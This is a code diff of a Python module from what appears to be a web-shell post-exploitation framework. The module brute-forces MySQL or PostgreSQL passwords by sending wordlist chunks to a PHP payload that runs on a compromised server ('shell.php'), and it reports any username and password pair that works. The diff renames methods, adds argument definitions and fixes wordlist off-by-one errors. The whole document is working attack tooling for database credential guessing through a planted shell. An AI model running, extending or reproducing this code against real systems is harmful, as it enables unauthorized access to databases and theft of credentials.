@@ -8,6 +8,7 @@ from core.module import Module, ModuleException
 from core.vector import VectorList, Vector
 from random import choice
 from math import ceil
+from core.parameters import ParametersList, Parameter as P
 
 classname = 'Sql'
  
@@ -17,7 +18,7 @@ class Sql(Module):
     '''
     
     vectors = VectorList([
-            Vector('shell.php', 'brute_mysql_php', """$m="%s"; $h="%s"; $u="%s"; $w=$_POST["%s"]; 
+            Vector('shell.php', 'brute_sql_php', """$m="%s"; $h="%s"; $u="%s"; $w=$_POST["%s"]; 
 foreach(split('[\n]+',$w) as $pwd) {
 if(@$m($h, $u, $pwd)){
 print("+" . $u . ":" . $pwd . "\n");
@@ -27,6 +28,12 @@ break;
 """)
             ])
 
+    params = ParametersList('Bruteforce single ftp user using a local wordlist', None,
+            P(arg='dbms', help='Database', choices=['mysql', 'postgres'], required=True, pos=0),
+            P(arg='user', help='SQL user to bruteforce', required=True, pos=1),
+            P(arg='lpath', help='Path of local wordlist', required=True, pos=2),
+            P(arg='sline', help='Start line of local wordlist', default='all', pos=3),
+            P(arg='host', help='SQL host or host:port', default='127.0.0.1', pos=4))
 
 
     def __init__( self, modhandler , url, password):
@@ -35,7 +42,7 @@ break;
         Module.__init__(self, modhandler, url, password)
         
         
-    def run( self, mode, host, user, filename, start_line, substitutive_wl = []):
+    def run_module( self, mode, user, filename, start_line, host, substitutive_wl = []):
 
         if mode == 'mysql':
             sql_connect = "mysql_connect"
@@ -47,7 +54,7 @@ break;
         if start_line == 'all':
             start_line = 0
 
-        if host not in ('localhost', '127.0.0.1'):
+        if 'localhost' not in host and '127.0.0.1' not in host:
             self.chunksize = 20
 
         if substitutive_wl:
@@ -91,20 +98,19 @@ break;
         
             startword = i*self.chunksize
             if i == chunks:
-                endword = len(wl)-1
+                endword = len(wl)
             else:
                 endword = (i+1)*self.chunksize
                 
             joined_wl='\n'.join(wl[startword:endword])
         
             payload = self.__prepare_payload(vector, parameters[:-2]) 
-            
-            response = self.modhandler.load(vector.interpreter).run(payload, post_data = {rand_post_name : joined_wl})
+            response = self.modhandler.load(vector.interpreter).run_module(payload, post_data = {rand_post_name : joined_wl})
             if response:
                 if response.startswith('+'):
                     return "[%s] FOUND! (%s)" % (self.name,response[1:])
             else:
-                self.mprint("Try #%i: (%s:%s) ..." % (endword+start_line, parameters[2], wl[endword]))
+                self.mprint("Try #%i: (%s:%s) ..." % (endword+start_line, parameters[2], wl[endword-1]))
 
 
     def __prepare_payload( self, vector, parameters ):
